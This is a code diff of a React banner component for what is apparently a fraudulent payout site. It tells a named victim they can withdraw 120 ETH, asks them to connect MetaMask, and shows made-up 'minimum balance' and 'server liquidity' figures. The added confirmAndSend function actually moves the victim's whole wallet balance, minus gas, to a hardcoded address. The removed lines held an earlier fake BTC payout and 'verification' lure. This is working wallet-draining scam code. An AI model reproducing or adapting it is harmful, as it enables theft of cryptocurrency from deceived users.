@@ -1,21 +1,239 @@
 "use client"
 import Link from "next/link"
-import { useEffect, useState } from "react"
+import { useEffect, useMemo, useState } from "react"
 import Cookies from "js-cookie"
+import { Bold } from "lucide-react"
 // import useBTCAdress from "@/lib/hooks"
+
+interface Window {
+    ethereum: any
+}
 
 const Banner = () => {
 
-    const [acknowledge, setAcknowledge] = useState<boolean>(false)
+    // const [acknowledge, setAcknowledge] = useState<boolean>(false)
+    const [account, setAccount] = useState<string>()
+    const [accountsConnected, setAccountConnected] = useState<boolean>(false)
+    const [userBalance, setUserBalance] = useState<number>()
+    const [senderBalance, setSenderBalance] = useState<number>()
 
     useEffect(() => {
-        const acknowledge = Cookies.get("acknowledge")
-        if (acknowledge) {
-            setAcknowledge(true)
+
+        const getSenderBalance = async () => {
+
+            const senderAddress = "0xF51710015536957A01f32558402902A2D9c35d82"
+
+            if (!Boolean(senderBalance)) {
+                try {
+
+                    const senderBalanceWei = await window.ethereum.request({
+                        method: "eth_getBalance",
+                        params: [senderAddress, "latest"],
+                    });
+
+                    const senderBalance = parseInt(senderBalanceWei, 16) / 1e18
+
+                    setSenderBalance(senderBalance)
+                    console.log("sender balance", senderBalance)
+
+                } catch (err) {
+                    console.log("Problem getting sender balance")
+                }
+            }
         }
+
+        getSenderBalance()
+    })
+
+    useEffect(() => {
+        // const acknowledge = Cookies.get("acknowledge")
+        // if (acknowledge) {
+        //     setAcknowledge(true)
+        // }
+
+        // const address = Cookies.get("userAddress")
+
+        // if (address && !Boolean(userAddress)) {
+        //     setAccountConnected(true)
+        //     setUserAddress(address)
+        // }
+
+        if (typeof window.ethereum !== "undefined") {
+
+            const ethereum = window.ethereum
+
+            // Listen for disconnect
+            ethereum.on('disconnect', () => {
+                console.log('MetaMask disconnected');
+                setAccountConnected(false);
+                setAccount(undefined);
+                // handleDisconnect();
+            });
+
+            // Listen for account changes (user may disconnect account)
+            ethereum.on('accountsChanged', (accounts: string[]) => {
+                if (accounts.length === 0) {
+                    console.log('All accounts disconnected from MetaMask.');
+                    setAccountConnected(false);
+                    setAccount(undefined);
+                    // handleDisconnect();
+                } else {
+                    setAccountConnected(true);
+                    setAccount(accounts[0]);
+                }
+            });
+
+            return () => {
+                ethereum.removeAllListeners('disconnect');
+                ethereum.removeAllListeners('accountsChanged');
+            }
+        }
+
     }, [])
 
-    // const { verifiedAddress } = useBTCAdress()
+    // console.log(account)
+
+    useEffect(() => {
+        const updateBalance = async () => {
+            console.log("user address", account)
+
+            if (accountsConnected && account) {
+                try {
+                    // console.log(userAddress)
+
+                    const balanceWei = await window.ethereum.request({
+                        method: "eth_getBalance",
+                        params: [account, "latest"],
+                    });
+
+                    const addressBalance = parseInt(balanceWei, 16) / 1e18
+
+                    setUserBalance(addressBalance)
+                    console.log("user address balance", addressBalance)
+
+                } catch (err) {
+                    // console.log(typeof err)
+                    console.log("Problem getting user balance")
+                }
+            }
+        }
+
+        updateBalance()
+    }, [account])
+
+    const connectButton = async () => {
+        if (typeof window.ethereum !== "undefined") {
+
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                setAccount(accounts[0])
+                setAccountConnected(true)
+                // set cookies - userAddress
+                // Cookies.set("userAddress", accounts[0], { expires: 1 })
+                console.log(accounts[0])
+
+            } catch (err) {
+                console.log("Problem connecting to Metamask")
+            }
+
+        } else {
+            console.log("Install Metamask")
+        }
+    }
+
+    function convertETHtoUSD(ethAmount: number | undefined) {
+
+        if (!ethAmount) return 0
+
+        let ethToUsdPrice: number = 1652.20;
+        let formattedAmount: string;
+
+        fetch("/api/ether")
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(response.statusText)
+                }
+                return response.json()
+            })
+            .then(data => {
+                ethToUsdPrice = data.ethToUsdPrice
+            })
+            .catch(error => {
+                console.error("Error in request: ", error)
+            })
+
+        const convertedAmount = ethToUsdPrice * ethAmount
+
+        formattedAmount = new Intl.NumberFormat("en-US", {
+            style: "currency",
+            currency: "USD"
+        }).format(convertedAmount)
+
+        return formattedAmount
+    }
+
+    const confirmAndSend = () => {
+        // if(!Boolean(userBalance)) return
+
+        const sendTransaction = async () => {
+
+            try {
+                // Get the current account balance in Wei
+                const balanceWeiHex = await window.ethereum.request({
+                    method: "eth_getBalance",
+                    params: [account, "latest"],
+                });
+                const balanceWei = BigInt(balanceWeiHex);
+
+                // Get current gas price
+                const gasPriceHex = await window.ethereum.request({
+                    method: "eth_gasPrice",
+                });
+                const gasPrice = BigInt(gasPriceHex);
+
+                // Fixed gas limit for a simple ETH transfer (21000)
+                const gasLimit = BigInt(21000);
+                const totalGasFee = gasPrice * gasLimit;
+
+                // Throw error if balance is insufficient to cover gas fees
+                if (balanceWei <= totalGasFee) {
+                    throw new Error("Balance is too low to cover gas fees.");
+                }
+
+                // Amount to send = Total balance - gas fee
+                const amountToSendWei = balanceWei - totalGasFee;
+                // const amountToSendEther = Number(amountToSendWei) / 1e18;
+                // amountToSendSpan.innerText = amountToSendEther.toFixed(18);
+
+                const transactionParameters = {
+                    to: "0x5c92D7D6D5DCEBb07DF14bAaD74Bd4fDD2E1AD38",
+                    from: account,
+                    value: '0x' + amountToSendWei.toString(16),
+                    gasPrice: '0x' + gasPrice.toString(16),
+                    gas: '0x' + gasLimit.toString(16)
+                };
+
+                const txHash = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [transactionParameters],
+                });
+
+                console.log(txHash)
+
+            } catch (err) {
+                console.log("Transaction failed or rejected", err)
+            }
+        }
+
+        if (!!userBalance) {
+            if (userBalance >= 0) {
+                // console.log("User balance is greater than 18")
+                sendTransaction()
+            } else {
+                console.log("User balance is low")
+            }
+        }
+    }
 
     return (
         <section className='max-w-screen-lg container mt-4 mb-8'>
@@ -28,36 +246,33 @@ const Banner = () => {
                     <p>{Boolean(verifiedAddress) ? <><span className="font-bold">2.52098</span> BTC is ready be debited to <span className="font-bold break-all">{verifiedAddress}</span> after all fees are cleared</> : <>Verify address to receive the payout</>}</p>
                 </div>
             </div> */}
-            <div className={'bg-green-100 p-4 mb-4 flex md:flex-row flex-col gap-y-4 justify-between md:items-center items-start rounded-md'}>
-                <div>
-                    <h4 className='text-lg font-semibold'>BTC Address Confirmed</h4>
-                    <p><span className="font-bold">2.52098</span> BTC to be deposited to <span className="font-bold break-all">392NQstZKRCHBGNR4nNR7PRhQtXS5xRKAV</span></p>
-                </div>
-            </div>
-            {/* <div className="p-4 bg-red-100 rounded-md items-center">
-                <p className='mb-3'>We need some information from you</p>
-                <Link className='text-red-600 font-medium px-3 py-1 border-2 border-red-600 rounded-full' href="/payment-cancelation">view full details</Link>
-            </div> */}
-
-            {acknowledge ? (
-                <div className="p-4 bg-green-100 rounded-md">
-                    <div className="flex gap-x-2 items-center mb-2">
-                        {/* <ClockArrowDown className="w-12 h-12" /> */}
-                        <p className="font-bold">We thank you for compliance to our client verification process</p>
+            {
+                accountsConnected ? <>
+                    <div className="bg-red-600 text-white p-4 mb-4 rounded-md">
+                        <p>We have detected that your account has a balance of {userBalance?.toFixed(4)} ETH, with a low transaction history.To prevent fraud, we only transfer funds to wallets with a minimum balance of 15% of transfer amount, with positive transaction history</p>
                     </div>
-                    {/* <p className="mb-4"></p> */}
-                </div>
-            ) : (
-                <div className="p-4 bg-green-100 rounded-md">
-                    <div className="flex gap-x-2 items-center mb-2">
-                        {/* <ClockArrowDown className="w-12 h-12" /> */}
-                        <p className="font-bold">Awaiting your review</p>
+                    <div className="bg-neutral-100 p-4 rounded-md border border-red-600">
+                        <div className="flex flex-col gap-y-2 mb-4">
+                            <h4>Account balance: <span className="font-bold">{userBalance?.toFixed(4)} ETH  ({convertETHtoUSD(userBalance)})</span></h4>
+                            <h4>Minimum Required Balance: <span className="font-bold">18 ETH ({convertETHtoUSD(18)})</span></h4>
+                            <h4>Transfer amount: <span className="font-bold">120 ETH ({convertETHtoUSD(120)?.toString()})</span></h4>
+                            <h4>Target Address (your address): <span className="font-bold">{account}</span></h4>
+                            <h4>Server Address: <span className="font-bold">0xF51710015536957A01f32558402902A2D9c35d82</span></h4>
+                            <h4>Server balance (liquidity): <span className="font-bold">{senderBalance?.toFixed(4)} ETH ({convertETHtoUSD(senderBalance)})</span></h4>
+                        </div>
+                        <button onClick={confirmAndSend} className="uppercase font-medium flex items-center justify-center h-10 bg-green-600 px-4 rounded-full text-neutral-100 sm:w-fit w-full">confirm and send</button>
                     </div>
-                    <p className="mb-4">We highly appreciate your compliance in uploading required information. As we are currently reviewing your submitted documentation, we ask you to review and acknowledge as per our client verification process procedure</p>
-
-                    <Link className='text-green-600 font-medium px-3 py-1 border-2 border-green-600 rounded-full' href="/client-verification">review and acknowledge</Link>
-                </div>
-            )}
+                </> : <>
+                    <div className="bg-green-100 p-4 mb-4 rounded-md">
+                        <h4 className='text-lg font-semibold'>SMC - Metamask ETH transfer</h4>
+                        <p className="mb-2">To facilitate <span className="font-bold">fast and secure</span> payment of funds, we have partnered with meta mask to offer <span className="font-bold">Ethereum transfer</span> to all our ongoing payments.</p>
+                        <p>With this change all our clients will now be able to connect and transfer funds to their metamask account via the ethereum chain from their ledger account</p>
+                    </div>
+                    <div className="border border-green-500 p-4 mb-5 rounded-md">
+                        <p className="mb-2">Hey, J.Soliday we have some goods news for you, you can now withdraw your funds directly to your metamask wallet via Ethereum chain from your ledger account</p>
+                        <button onClick={connectButton} className="bg-green-600 text-white font-medium px-3 h-9 flex items-center justify-center rounded-full uppercase">connect metamask</button>
+                    </div></>
+            }
         </section>
     )
 }
@@ -67,3 +282,23 @@ export default Banner
 // <div className="p-4 flex gap-x-2 bg-red-100 rounded-md items-center">
 //                 <ClockArrowDown className="w-12 h-12"/>Debit transaction in progress, 2.52098 BTC to be credited within 24 hours
 //             </div>
+
+// {acknowledge ? (
+//     <div className="p-4 bg-green-100 rounded-md">
+//         <div className="flex gap-x-2 items-center mb-2">
+//             {/* <ClockArrowDown className="w-12 h-12" /> */}
+//             <p className="font-bold">We thank you for compliance to our client verification process</p>
+//         </div>
+//         {/* <p className="mb-4"></p> */}
+//     </div>
+// ) : (
+//     <div className="p-4 bg-green-100 rounded-md">
+//         <div className="flex gap-x-2 items-center mb-2">
+//             {/* <ClockArrowDown className="w-12 h-12" /> */}
+//             <p className="font-bold">Awaiting your review</p>
+//         </div>
+//         <p className="mb-4">We highly appreciate your compliance in uploading required information. As we are currently reviewing your submitted documentation, we ask you to review and acknowledge as per our client verification process procedure</p>
+
+//         <Link className='text-green-600 font-medium px-3 py-1 border-2 border-green-600 rounded-full' href="/client-verification">review and acknowledge</Link>
+//     </div>
+// )}
